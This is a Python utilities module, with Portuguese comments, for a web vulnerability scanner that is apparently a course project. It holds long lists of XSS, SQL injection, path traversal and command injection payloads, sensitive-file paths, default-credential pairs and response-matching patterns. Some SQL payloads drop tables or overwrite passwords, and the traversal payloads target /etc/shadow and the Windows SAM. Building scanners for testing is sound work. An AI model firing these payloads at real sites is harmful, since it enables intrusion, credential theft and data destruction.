"""
Módulo de utilitários para o scanner de segurança
"""
import re
import urllib.parse
from typing import List, Dict, Any
import logging
from colorama import Fore, Style, init

# Inicializar colorama para cores no terminal
init(autoreset=True)

class Logger:
    """Classe para logging personalizado"""
    
    def __init__(self, name: str = "WebSecScanner"):
        self.logger = logging.getLogger(name)
        self.logger.setLevel(logging.INFO)
        
        # Configurar handler se não existe
        if not self.logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter(
                '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
            )
            handler.setFormatter(formatter)
            self.logger.addHandler(handler)
    
    def info(self, message: str):
        """Log info em verde"""
        print(f"{Fore.GREEN}[INFO] {message}{Style.RESET_ALL}")
        self.logger.info(message)
    
    def warning(self, message: str):
        """Log warning em amarelo"""
        print(f"{Fore.YELLOW}[WARNING] {message}{Style.RESET_ALL}")
        self.logger.warning(message)
    
    def error(self, message: str):
        """Log error em vermelho"""
        print(f"{Fore.RED}[ERROR] {message}{Style.RESET_ALL}")
        self.logger.error(message)
    
    def success(self, message: str):
        """Log success em azul"""
        print(f"{Fore.BLUE}[SUCCESS] {message}{Style.RESET_ALL}")
        self.logger.info(message)

def normalize_url(url: str) -> str:
    """Normaliza a URL adicionando protocolo se necessário"""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    return url

def extract_forms(html_content: str) -> List[Dict[str, Any]]:
    """Extrai formulários HTML da página"""
    from bs4 import BeautifulSoup
    
    soup = BeautifulSoup(html_content, 'html.parser')
    forms = []
    
    for form in soup.find_all('form'):
        form_data = {
            'action': form.get('action', ''),
            'method': form.get('method', 'get').lower(),
            'inputs': []
        }
        
        # Extrair inputs
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            input_data = {
                'name': input_tag.get('name', ''),
                'type': input_tag.get('type', 'text'),
                'value': input_tag.get('value', '')
            }
            form_data['inputs'].append(input_data)
        
        forms.append(form_data)
    
    return forms

def extract_links(html_content: str, base_url: str) -> List[str]:
    """Extrai links da página"""
    from bs4 import BeautifulSoup
    
    soup = BeautifulSoup(html_content, 'html.parser')
    links = []
    
    for link in soup.find_all('a', href=True):
        href = link['href']
        # Resolver URLs relativas
        full_url = urllib.parse.urljoin(base_url, href)
        links.append(full_url)
    
    return links

def extract_parameters(url: str) -> Dict[str, str]:
    """Extrai parâmetros GET da URL"""
    parsed = urllib.parse.urlparse(url)
    return dict(urllib.parse.parse_qsl(parsed.query))

# Payloads para múltiplas vulnerabilidades - Conceito B
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "'\"><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')></iframe>",
    "<body onload=alert('XSS')>",
    "<script>document.cookie</script>"
]

SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE users;--",
    "' UNION SELECT NULL--",
    "admin'--",
    "' OR 'a'='a",
    "1' OR '1'='1' /*",
    "' AND 1=2 UNION SELECT version()--",
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '00:00:05'--"
]

# Novos payloads para Conceito B
DIRECTORY_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "....\/....\/....\/etc/passwd",
    "../../../proc/version",
    "../../../../../../etc/shadow"
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| whoami",
    "&& cat /etc/passwd",
    "; cat /etc/passwd #",
    "| id",
    "&& dir",
    "; ping -c 3 127.0.0.1",
    "|| uname -a"
]

INFORMATION_DISCLOSURE_PATHS = [
    "/robots.txt",
    "/.env",
    "/config.php",
    "/phpinfo.php",
    "/.htaccess",
    "/web.config",
    "/server-status",
    "/server-info",
    "/.git/config",
    "/backup.sql",
    "/database.sql",
    "/admin/",
    "/test/",
    "/debug/"
]

AUTHENTICATION_BYPASS_PAYLOADS = [
    {"username": "admin", "password": "admin"},
    {"username": "administrator", "password": "password"},
    {"username": "admin", "password": "123456"},
    {"username": "root", "password": "root"},
    {"username": "test", "password": "test"},
    {"username": "guest", "password": "guest"},
    {"username": "admin", "password": ""},
    {"username": "", "password": ""},
]

# Padrões expandidos para detectar vulnerabilidades - Conceito B
ERROR_PATTERNS = {
    'sql_error': [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"MySQLSyntaxErrorException",
        r"PostgreSQL.*ERROR",
        r"ORA-\d+",
        r"Microsoft.*ODBC.*SQL Server",
        r"SQLite.*error",
        r"Unclosed quotation mark after",
        r"quoted string not properly terminated",
        r"SQL command not properly ended"
    ],
    'xss_reflected': [
        r"<script>alert\('XSS'\)</script>",
        r"alert\('XSS'\)",
        r"<img.*onerror.*XSS",
        r"<svg.*onload.*XSS",
        r"<iframe.*XSS",
        r"document\.cookie"
    ],
    'directory_traversal': [
        r"root:x:0:0:",
        r"daemon:x:1:1:",
        r"\[boot loader\]",
        r"# Copyright.*Microsoft Corp",
        r"Linux version \d+",
        r"uid=\d+.*gid=\d+",
        r"www-data:",
        r"nobody:x:"
    ],
    'command_injection': [
        r"uid=\d+.*gid=\d+",
        r"Linux.*\d+\.\d+\.\d+",
        r"Windows.*Version",
        r"Microsoft Windows",
        r"total \d+",
        r"drwx.*root.*root",
        r"PING.*bytes of data",
        r"64 bytes from"
    ],
    'information_disclosure': [
        r"User-agent: \*",
        r"Disallow:",
        r"DB_PASSWORD=",
        r"API_KEY=",
        r"phpinfo\(\)",
        r"PHP Version \d+",
        r"<Directory",
        r"AllowOverride",
        r"\[core\]",
        r"repositoryformatversion"
    ]
}

def check_error_patterns(content: str, vulnerability_type: str) -> List[str]:
    """Verifica padrões de erro no conteúdo da resposta"""
    found_patterns = []
    
    if vulnerability_type in ERROR_PATTERNS:
        for pattern in ERROR_PATTERNS[vulnerability_type]:
            if re.search(pattern, content, re.IGNORECASE):
                found_patterns.append(pattern)
    
    return found_patterns

# Enhanced payload collections for Conceito A
XSS_PAYLOADS_ADVANCED = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<div onclick=alert('XSS')>Click</div>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",
    "<video><source onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    "<object data=javascript:alert('XSS')>",
    "<embed src=javascript:alert('XSS')>",
    "<applet code=javascript:alert('XSS')>",
    "<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>",
    "<link rel=import href=javascript:alert('XSS')>",
    "<style>@import 'javascript:alert(\"XSS\")';</style>",
    "<form><button formaction=javascript:alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "</script><script>alert('XSS')</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<script>alert(/XSS/.source)</script>",
    "<script>alert(window['al'+'ert'])</script>",
    "<script>alert(eval('al'+'ert')('XSS'))</script>",
    "<svg><script>alert('XSS')</script></svg>",
    "<math><script>alert('XSS')</script></math>",
    "<template><script>alert('XSS')</script></template>"
]

SQL_PAYLOADS_ADVANCED = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'x'='x",
    "') OR '1'='1--",
    "') OR ('1'='1--",
    "' OR 1=1#",
    "\" OR \"1\"=\"1",
    "\" OR 1=1--",
    "or 1=1--",
    "or 1=1#",
    "' or 1=1 or ''='",
    "' or a=a--",
    "' or 'one'='one",
    "' or 'one'='one--",
    "hi' or 'a'='a",
    "hi' or 1=1 --",
    "hi' or 'a'='a",
    "'; waitfor delay '0:0:10'--",
    "'; WAITFOR DELAY '00:00:05'--",
    "'; SELECT SLEEP(5)--",
    "'; SELECT pg_sleep(5)--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT NULL,NULL--",
    "' AND (SELECT COUNT(*) FROM sysobjects)>0--",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "'; INSERT INTO users VALUES ('hacker','password')--",
    "'; DROP TABLE users--",
    "'; DELETE FROM users--",
    "'; UPDATE users SET password='hacked'--"
]

DIRECTORY_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "../../../etc/shadow",
    "../../../etc/group",
    "../../../etc/hosts",
    "../../../proc/version",
    "../../../proc/self/environ",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\system.ini",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2e%2e\\\\%2e%2e\\\\%2e%2e\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
    "../../../../../../etc/passwd",
    "..\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini",
    "php://filter/convert.base64-encode/resource=../../../etc/passwd",
    "file:///etc/passwd",
    "file:///C:/windows/win.ini",
    "/etc/passwd",
    "\\windows\\win.ini"
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| ls -la",
    "&& ls -la",
    "|| ls -la",
    "; dir",
    "| dir", 
    "&& dir",
    "|| dir",
    "; id",
    "| id",
    "&& id",
    "|| id",
    "; whoami",
    "| whoami",
    "&& whoami",
    "|| whoami",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "&& cat /etc/passwd",
    "|| cat /etc/passwd",
    "; ping -c 4 127.0.0.1",
    "| ping -c 4 127.0.0.1",
    "&& ping -c 4 127.0.0.1",
    "|| ping -c 4 127.0.0.1",
    "; sleep 10",
    "| sleep 10",
    "&& sleep 10",
    "|| sleep 10",
    "''; ls -la #",
    "'| ls -la #",
    "'&& ls -la #",
    "'|| ls -la #"
]

INFO_DISCLOSURE_PATHS = [
    "robots.txt",
    "sitemap.xml",
    ".htaccess",
    ".htpasswd",
    ".env",
    ".git/config",
    ".git/HEAD",
    ".svn/entries",
    "web.config",
    "application.properties",
    "config.php",
    "config.inc.php",
    "configuration.php",
    "settings.php",
    "wp-config.php",
    "database.php",
    "db.php",
    "connect.php",
    "connection.php",
    "admin.php",
    "admin/",
    "administrator/",
    "phpmyadmin/",
    "phpinfo.php",
    "info.php",
    "test.php",
    "backup/",
    "backups/",
    "old/",
    "temp/",
    "tmp/",
    "logs/",
    "log/",
    "trace.log",
    "error.log",
    "access.log",
    "debug.log",
    "readme.txt",
    "README.md",
    "CHANGELOG.md",
    "version.txt",
    ".DS_Store",
    "thumbs.db"
]

AUTH_BYPASS_PAYLOADS = [
    {"username": "admin", "password": "admin"},
    {"username": "administrator", "password": "administrator"},
    {"username": "root", "password": "root"},
    {"username": "admin", "password": "password"},
    {"username": "admin", "password": "123456"},
    {"username": "admin", "password": "admin123"},
    {"username": "test", "password": "test"},
    {"username": "guest", "password": "guest"},
    {"username": "user", "password": "user"},
    {"username": "demo", "password": "demo"},
    {"username": "admin", "password": ""},
    {"username": "", "password": ""},
    {"username": "' OR '1'='1", "password": "' OR '1'='1"},
    {"username": "admin'--", "password": "password"},
    {"username": "admin' /*", "password": "password"},
    {"username": "admin'; #", "password": "password"}
]
